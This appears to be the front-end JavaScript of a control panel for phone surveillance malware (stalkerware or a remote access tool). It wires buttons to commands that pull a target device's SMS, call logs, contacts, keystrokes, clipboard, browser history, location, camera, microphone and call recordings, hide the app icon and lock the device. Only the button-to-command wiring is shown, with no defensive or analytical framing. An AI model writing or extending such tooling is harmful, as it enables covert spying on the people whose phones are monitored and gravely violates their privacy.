// ==================== MAIN INITIALIZATION ====================
document.addEventListener('DOMContentLoaded', () => {
    // Initialize auth form
    renderAuthForm();
    
    // Setup button event listeners
    setupEventListeners();
});

function setupEventListeners() {
    // Surveillance buttons
    document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
    document.getElementById('clickPictureBtn').addEventListener('click', () => toggleCameraPanel('click'));
    document.getElementById('capturePictureBtn').addEventListener('click', capturePicture);
    document.getElementById('liveCameraBtn').addEventListener('click', () => toggleCameraPanel('live'));
    document.getElementById('startLiveStreamBtn').addEventListener('click', startLiveStream);
    document.getElementById('liveAudioBtn').addEventListener('click', toggleLiveAudio);
    document.getElementById('stopLiveAudioBtn').addEventListener('click', stopLiveAudio);
    document.getElementById('getLocationBtn').addEventListener('click', () => sendCommand('GET_LOCATION'));
    
    // Data buttons
    document.getElementById('fileManagerBtn').addEventListener('click', () => sendCommand('LIST_FILES', { path: 'root' }));
    document.getElementById('smsInboxBtn').addEventListener('click', () => sendCommand('GET_SMS', { box: 'inbox' }));
    document.getElementById('smsSentBtn').addEventListener('click', () => sendCommand('GET_SMS', { box: 'sent' }));
    document.getElementById('callLogsBtn').addEventListener('click', () => sendCommand('GET_CALL_LOGS'));
    document.getElementById('contactsBtn').addEventListener('click', () => sendCommand('GET_CONTACTS'));
    document.getElementById('installedAppsBtn').addEventListener('click', () => sendCommand('GET_INSTALLED_APPS'));
    document.getElementById('browserHistoryBtn').addEventListener('click', () => sendCommand('GET_BROWSER_HISTORY'));
    document.getElementById('wifiNetworksBtn').addEventListener('click', () => sendCommand('GET_WIFI_NETWORKS'));
    
    // Monitoring buttons
    document.getElementById('screenTimeBtn').addEventListener('click', showAppUsagePanel);
    document.getElementById('socialMessagesBtn').addEventListener('click', showSocialMessagesPanel);
    document.getElementById('keylogBtn').addEventListener('click', () => sendCommand('GET_KEYLOG'));
    document.getElementById('clipboardBtn').addEventListener('click', () => sendCommand('GET_CLIPBOARD'));
    document.getElementById('geofenceBtn').addEventListener('click', showGeofencePanel);
    document.getElementById('autoCaptureBtn').addEventListener('click', showSchedulePanel);
    document.getElementById('liveGpsBtn').addEventListener('click', toggleLiveGps);
    document.getElementById('locationHistoryBtn').addEventListener('click', showLocationHistoryPanel);
    document.getElementById('callRecordingsBtn').addEventListener('click', showCallRecordingsPanel);
    document.getElementById('photoGalleryBtn').addEventListener('click', showPhotoGalleryPanel);
    document.getElementById('appEventsBtn').addEventListener('click', showAppEventsPanel);
    document.getElementById('smsKeywordsBtn').addEventListener('click', showSmsKeywordsPanel);
    
    // Control buttons
    document.getElementById('toggleAppIconBtn').addEventListener('click', toggleAppIcon);
    document.getElementById('lockDeviceBtn').addEventListener('click', () => sendCommand('LOCK_DEVICE'));
    document.getElementById('sendSmsBtn').addEventListener('click', showSendSmsPanel);
    document.getElementById('vibrateBtn').addEventListener('click', () => sendCommand('VIBRATE', { duration: 1000 }));
    document.getElementById('toggleFlashBtn').addEventListener('click', toggleFlash);
    document.getElementById('flashTimedBtn').addEventListener('click', () => sendCommand('FLASH_TIMED', { duration: 5000 }));
    
    // Utility buttons
    document.getElementById('reconnectBtn').addEventListener('click', manualReconnect);
    document.getElementById('clearAlertsBtn').addEventListener('click', clearAlerts);
    document.getElementById('logoutBtn').addEventListener('click', logout);
}
